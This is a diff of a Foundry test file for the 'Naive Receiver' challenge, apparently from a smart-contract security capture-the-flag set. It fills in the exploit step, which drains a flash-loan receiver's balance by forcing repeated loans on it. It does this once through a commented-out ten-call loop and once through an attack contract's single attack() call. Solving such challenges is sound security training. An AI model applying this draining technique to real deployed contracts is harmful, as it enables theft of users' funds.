@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
 import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
+import {NaiveRecieverAttack} from "../../../src/Contracts/naive-receiver/NaiveReceiverAttack.sol";
 
 contract NaiveReceiver is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -14,6 +15,8 @@ contract NaiveReceiver is Test {
     Utilities internal utils;
     NaiveReceiverLenderPool internal naiveReceiverLenderPool;
     FlashLoanReceiver internal flashLoanReceiver;
+    NaiveRecieverAttack internal naiveReceiverAttack; 
+
     address payable internal user;
     address payable internal attacker;
 
@@ -36,19 +39,36 @@ contract NaiveReceiver is Test {
         flashLoanReceiver = new FlashLoanReceiver(
             payable(naiveReceiverLenderPool)
         );
+
+        naiveReceiverAttack = new NaiveRecieverAttack(address(naiveReceiverLenderPool), address(flashLoanReceiver));
         vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
         vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);
 
         assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);
 
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
+
+
     }
 
     function testExploit() public {
         /**
          * EXPLOIT START *
          */
+        // @note exploit performed in 10 seperate transactions
+        // vm.startPrank(attacker);
+        // for (uint i = 0; i < 10; i++){
+        //     naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1_000e18);
+        //     console.log(i);
+        // }
+        // vm.stopPrank();
 
+        // @note exploit performed using an attack contract where this happens in 1 transaction
+        vm.startPrank(attacker);
+
+        naiveReceiverAttack.attack();
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
